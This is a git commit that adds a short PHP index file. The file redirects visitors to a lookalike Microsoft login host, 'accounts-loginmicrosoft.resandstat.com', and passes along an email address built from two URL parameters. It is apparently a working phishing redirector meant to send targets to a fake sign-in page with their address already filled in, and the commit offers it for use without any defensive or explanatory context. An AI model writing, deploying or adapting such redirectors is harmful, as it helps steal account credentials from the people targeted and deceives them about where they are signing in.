a440ca56597da5ca359eea1455b63c64243ab6fc
intbadboy <53456643+intbadboy@users.noreply.github.com>
2019-08-15 00:16:04 +0100

    Add files via upload

---
+++ index.php
@@ -0,0 +1,16 @@
+<?php
+
+
+function Redirect($url, $permanent = false)
+{
+ if (headers_sent() === false)
+ {
+ header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
+ }
+
+ exit();
+}
+
+Redirect("https://accounts-loginmicrosoft.resandstat.com/auth/login.php/?client_id=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
+
+?>
